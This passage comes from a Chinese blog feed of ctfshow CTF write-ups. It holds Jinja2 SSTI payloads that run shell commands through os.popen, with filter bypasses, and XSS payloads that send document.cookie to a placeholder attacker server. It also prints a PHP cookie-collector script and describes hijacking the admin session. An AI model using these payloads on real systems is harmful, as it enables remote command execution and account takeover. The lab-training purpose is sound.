class="hljs-character">\u0053</span><span class="hljs-character">\u0031</span><span class="hljs-character">\u006b</span><span class="hljs-character">\u004d</span><span class="hljs-character">\u0054</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u0054</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0034</span><span class="hljs-character">\u004e</span><span class="hljs-character">\u0044</span><span class="hljs-character">\u0041</span><span class="hljs-character">\u0034</span><span class="hljs-character">\u0059</span><span class="hljs-character">\u006a</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u0039</span><span class="hljs-character">\u000a</span><br></code></pre></td></tr></table></figure><p>解码后base64再解码获得flag</p><p>或者控制台发送scores&#x3D;100000000</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2023/10/22/ssti/"/>
    <url>/2023/10/22/ssti/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI漏洞原理"><a href="#SSTI漏洞原理" class="headerlink" title="SSTI漏洞原理"></a>SSTI漏洞原理</h1><p><a href="https://www.freebuf.com/articles/web/345059.html">SSTI漏洞原理</a><br><strong>常用方法</strong></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__class__</span>           查看对象所在的类<br><span class="hljs-variable">__mro__</span>             查看继承关系和调用顺序，返回元组<br><span class="hljs-variable">__base__</span>            返回基类<br><span class="hljs-variable">__bases__</span>           返回基类元组<br><span class="hljs-variable">__subclasses__</span>()    返回子类列表<br><span class="hljs-variable">__init__</span>            调用初始化函数，可以用来跳到<span class="hljs-variable">__globals__</span><br><span class="hljs-variable">__globals__</span>         返回函数所在的全局命名空间所定义的全局变量，返回字典<br><span class="hljs-variable">__builtins__</span>        返回内建内建名称空间字典<br><span class="hljs-variable">__dic__</span>              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-variable">__dict__</span>里<br><span class="hljs-variable">__getattribute__</span>()   实例、类、函数都具有的<span class="hljs-variable">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用<span class="hljs-variable">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br><span class="hljs-variable">__getitem__</span>()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="hljs-string">&#x27;b&#x27;</span>]，就是a.<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-variable">__builtins__</span>         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<span class="hljs-variable">__builtins__</span>与<span class="hljs-variable">__builtin__</span>的区别就不放了，百度都有。<br><span class="hljs-variable">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()]<br><span class="hljs-variable">__str__</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。<br>url_for              flask的一个方法，可以用于得到<span class="hljs-variable">__builtins__</span>，而且url_for.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]含有current_app<br>get_flashed_messages flask的一个方法，可以用于得到<span class="hljs-variable">__builtins__</span>，而且url_for.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]含有current_app<br>lipsum               flask的一个方法，可以用于得到<span class="hljs-variable">__builtins__</span>，而且lipsum.<span class="hljs-variable">__globals__</span>含有os模块：&#123;&#123;lipsum.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>&#123;&#123;cycler.<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>current_app          应用上下文，一个全局变量<br>request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/proc\self\fd/3&#x27;</span>).read()<br>request.args.x1    <span class="hljs-built_in">get</span>传参<br>request.values.x1  所有参数<br>request.cookies      cookies参数<br>request.headers      请求头参数<br>request.form.x1    post传参(Content-<span class="hljs-built_in">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)<br>request.data   post传参(Content-<span class="hljs-built_in">Type</span>:a/b)<br>request.json post传json  (Content-<span class="hljs-built_in">Type</span>: application/json)<br>config               当前application的所有配置。此外，也可以这样&#123;&#123;config.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read() &#125;&#125;<br><br></code></pre></td></tr></table></figure><h2 id="web361-362"><a href="#web361-362" class="headerlink" title="web361-362"></a>web361-362</h2><p>hint：名字就是考点<br>表示有个name变量</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?name=<span class="hljs-number">1</span><br><span class="hljs-regexp">//</span>none回显<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>hackbar上有很多现成的模板，很多都可以直接用<br>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//app.py</span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//ctfshow&#123;528550d1-1770-4688-aeb3-68030ed8dc49&#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>本题过滤了单引号和双引号<br>绕过过滤可以用request.args<br><a href="https://xz.aliyun.com/t/6885">传送门</a><br>假设传入<code>&#123;&#123;url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;</code>,因为引号被过滤，所以无法执行，可以把<code>[&#39;__import__&#39;]</code>换成[request.args.a]<br>而(‘os’)换成(request.args.b)(这里的a,b可以理解为自定义的变量，名字可以任意设置)<br>随后在后面传入a,b的值，变成<code>&#123;&#123;url_for.__globals__.__builtins__[request.args.a](request.args.b).popen(request.args.c).read()&#125;&#125;&amp;a=__import__&amp;b=os&amp;c=ls</code>，与原命令等效</p><p>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__</span>[request.args.a](<span class="hljs-name">request.args.b</span>).popen(<span class="hljs-name">request.args.c</span>).read()&#125;&#125;</span><span class="language-xml">&amp;a=__import__&amp;b=os&amp;c=ls</span><br><span class="language-xml">//app.py</span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__</span>[request.args.a](<span class="hljs-name">request.args.b</span>).popen(<span class="hljs-name">request.args.c</span>).read()&#125;&#125;</span><span class="language-xml">&amp;a=__import__&amp;b=os&amp;c=ls /</span><br><span class="language-xml">//app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__</span>[request.args.a](<span class="hljs-name">request.args.b</span>).popen(<span class="hljs-name">request.args.c</span>).read()&#125;&#125;</span><span class="language-xml">&amp;a=__import__&amp;b=os&amp;c=cat /flag</span><br><span class="language-xml">//ctfshow&#123;f2687c32-3db3-4c1c-be8b-fa160a8c3e70&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h2><p>本题过滤了单双引号，还过滤了args<br>但是我们仍然能用上题的方法，用cookies来代替args<br>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">GET:</span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__</span>[request.cookies.a](<span class="hljs-name">request.cookies.b</span>).popen(<span class="hljs-name">request.cookies.c</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">COOKIES:</span><br><span class="language-xml">a=__import__;b=os;c=ls</span><br></code></pre></td></tr></table></figure><p>方法二：char()绕过<br>用下面的payload判断chr()函数的位置</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__bases__</span>[0].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure><p>在burpsuite里爆破<br><img src="/images/N2MCN3WWEP2J0I.png"></p><p><img src="/images/GQR2HB64V2PTRU.png" alt="参数"></p><p>爆破完选择状态为200的<br><img src="/images/IWFCK25CU2JZIQK.png"><br>以80为例</p><p>这个爆破结果意味着<code>__subclasses__()[80]</code>中含有chr的类索引，即可以使用chr()</p><p>接下来把这一串<code>&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;</code>放到前面</p><p>原始payload是<code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('cat /flag').read() &#125;&#125;</code>，接下来要用chr()进行替换，对照ascii表</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-string">&#x27;os&#x27;</span>替换成chr<span class="hljs-comment">(111)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(115)</span><br><span class="hljs-string">&#x27;cat /flag&#x27;</span>替换成chr<span class="hljs-comment">(99)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(97)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(116)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(32)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(47)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(102)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(108)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(97)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(103)</span><br></code></pre></td></tr></table></figure><p>把替换后的payload放在后面，两段拼在一起得到最终姿势</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.__class__.__init__.__globals__</span>[chr(111)%2bchr(115)].popen(<span class="hljs-name">chr</span>(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">32</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">103</span>)).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h2><p>对比上一题多过滤了一个中括号</p><p>中括号绕过<br>可以用<code>__getitem__</code>和<code>pop</code>代替,但因为pop会破坏数组的结构，所以更推荐用<code>__getitem__</code></p><p>上题的payload改一改</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.__class__.__init__.__globals__</span>[chr(111)%2bchr(115)].popen(<span class="hljs-name">chr</span>(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">32</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">103</span>)).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">第一处的[]改为()</span><br><span class="language-xml">第二位的[0]改为__getitem__(0)或者直接删去</span><br><span class="language-xml">第三处的[80]改为.__getitem__(80)</span><br><span class="language-xml">第四处的[chr(111)%2bchr(115)]改为.__getitem__(chr(111)%2bchr(115))</span><br></code></pre></td></tr></table></figure><p>微操好的payload如下</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=&#123;%set+chr=().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(80).__init__.__globals__.__builtins__.chr%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__.__getitem__</span>(<span class="hljs-name">chr</span>(<span class="hljs-name">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)).popen(<span class="hljs-name">chr</span>(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">32</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">103</span>)).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p>上题方法一的payload也是如此</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">GET:</span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__.__getitem__</span>(<span class="hljs-name">request.cookies.a</span>)(<span class="hljs-name">request.cookies.b</span>).popen(<span class="hljs-name">request.cookies.c</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">COOKIES:</span><br><span class="language-xml">a=__import__;b=os;c=ls</span><br></code></pre></td></tr></table></figure><h2 id="web366-–过滤下划线、单引号、args、中括号"><a href="#web366-–过滤下划线、单引号、args、中括号" class="headerlink" title="web366 –过滤下划线、单引号、args、中括号"></a>web366 –过滤下划线、单引号、args、中括号</h2><p>本题多过滤了下划线，在上面的基础上要绕过url_for和__globals__<br>这里用attr方法：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;&quot;</span>|<span class="hljs-function"><span class="hljs-title">attr</span>(<span class="hljs-string">&quot;__class__&quot;</span>)</span><br>相当于<br><span class="hljs-string">&quot;&quot;</span>.__class__<br></code></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)).os.popen(<span class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookies:a=__globals__;b=cat /flag</span><br></code></pre></td></tr></table></figure><h2 id="web367-–过滤单双引号、args、中括号-、下划线、os"><a href="#web367-–过滤单双引号、args、中括号-、下划线、os" class="headerlink" title="web367 –过滤单双引号、args、中括号[]、下划线、os"></a>web367 –过滤单双引号、args、中括号[]、下划线、os</h2><p>测试发现过滤os继续用attr方法绕过</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)).get(<span class="hljs-name">request.cookies.b</span>).popen(<span class="hljs-name">request.cookies.c</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">Cookie:a=__globals__;b=os;c=cat /flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2023/10/20/xss/"/>
    <url>/2023/10/20/xss/</url>
    
    <content type="html"><![CDATA[<h1 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h1><p><a href="https://zhuanlan.zhihu.com/p/397940947">xss漏洞原理</a></p><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>有一个输入框<br>输入一个简单的script代码测试一下是否有xss漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hah&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>生成了一个警告框，说明有xss漏洞</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>//flag=you<span class="hljs-meta">%20are</span><span class="hljs-meta">%20not</span><span class="hljs-meta">%20admin</span><span class="hljs-meta">%20no</span><span class="hljs-meta">%20flag</span><br></code></pre></td></tr></table></figure><p>应该是自己x了自己<br>传到我们自己的服务器上<br>这是我提前写好的b.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/var/www/html/flag.txt&quot;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[a];<br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$data</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cg&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://ipipipip/b.php?a=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传后页面跳转，显示cg，而我们b.php里cg代表上传成功<br>进入flag.txt查看写入内容</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">PHPSESSID</span>=; <span class="hljs-attribute">flag</span>=ctfshow&#123;a6e4f621-36bf-442b-bcd4-c489b31f3696&#125;<br></code></pre></td></tr></table></figure><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>这题过滤了script大小写，但我们可以用img,input等等方法<br>img</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">location.href</span>=<span class="hljs-string">&#x27;http://ipipip/b.php?a=&#x27;</span>+<span class="hljs-attr">document.cookie</span>&gt;</span><br></code></pre></td></tr></table></figure><p>input</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input onfocus<span class="hljs-operator">=</span><span class="hljs-string">&quot;window.open(&#x27;http://ipipip/b.php?a=&#x27;+document.cookie)&quot;</span> autofocus&gt;<br></code></pre></td></tr></table></figure><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>增加了对img的过滤，但没过滤iput</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input onfocus<span class="hljs-operator">=</span><span class="hljs-string">&quot;window.open(&#x27;http://ipipip/b.php?a=&#x27;+document.cookie)&quot;</span> autofocus&gt;<br></code></pre></td></tr></table></figure><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>没有测试过滤了什么，但input仍然未被过滤，继续使用</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input onfocus<span class="hljs-operator">=</span><span class="hljs-string">&quot;window.open(&#x27;http://ippipi/b.php?a=&#x27;+document.cookie)&quot;</span> autofocus&gt;<br></code></pre></td></tr></table></figure><h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>测试了很多标签，但都没用<br>本题过滤了空格,空格用%09代替<br>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?msg=&lt;iframe%09onload%3D<span class="hljs-string">&quot;alert(&#x27;ll&#x27;)&quot;</span>&gt;&lt;%2Fiframe&gt;<br><br>?msg=&lt;iframe%09onload%3D<span class="hljs-string">&quot;window.open(&#x27;http%3A%2F%2Fipipippip%2Fb.php%3Fa%3D&#x27;%2Bdocument.cookie)&quot;</span>&gt;&lt;%2Fiframe&gt;<br></code></pre></td></tr></table></figure><p>在url上输入，在框内输入会被编码</p><h2 id="web321-322"><a href="#web321-322" class="headerlink" title="web321-322"></a>web321-322</h2><p>同上</p><h2 id="web323-326"><a href="#web323-326" class="headerlink" title="web323-326"></a>web323-326</h2><p>过滤了iframe<br>用body</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">&lt;<span class="hljs-keyword">body</span><span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;window.location.href=&#x27;http://ipipipip/b.php?a=&#x27;+document.cookie&quot;</span>&gt;&lt;/<span class="hljs-keyword">body</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>存储型xss<br>发件人随意，收件人admin不然会失败<br>x信的内容</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">&lt;<span class="hljs-keyword">body</span><span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;window.location.href=&#x27;http://ipipipip/b.php?a=&#x27;+document.cookie&quot;</span>&gt;&lt;/<span class="hljs-keyword">body</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>随便翻翻，用户管理需要admin才能查看账户密码<br>先狠狠的注入<br>经过测试用户名和密码都可以输入xss代码，没有限制<br>以用户名举例(经过测试，万能的body在这里不能用，反而script可以用)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">user：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://ippiip/b.php?a=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>password:123<br></code></pre></td></tr></table></figure><p>登录成功后看看我们的服务器flag.txt有没有收到内容<br>得到了一个PHPSESSID，但没有flag<br>这是管理员cookie<br>把cookie改了伪造下<br>先前不是说只有管理员才能看用户密码吗<br>切到用户管理页面，发现内容还是被不可见，但我们确实显示是admin了<br>抓个包试试<br>第一个包没有什么信息，但是我们又额外抓了一个包<br><img src="/images/ZQ6Q0JO91I4YGN81IC.png"><br>通过它的get信息<code>?page=1&amp;limit=10</code>知道了这是抓到了表格的包<br>它的cookie还是原来自己的cookie，我们将它改为获取的管理员cookie<br>返回界面，内容不再被遮掩<br><img src="/images/QHMPBTJS5QF18MMCTA0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>newstarctf 2023</title>
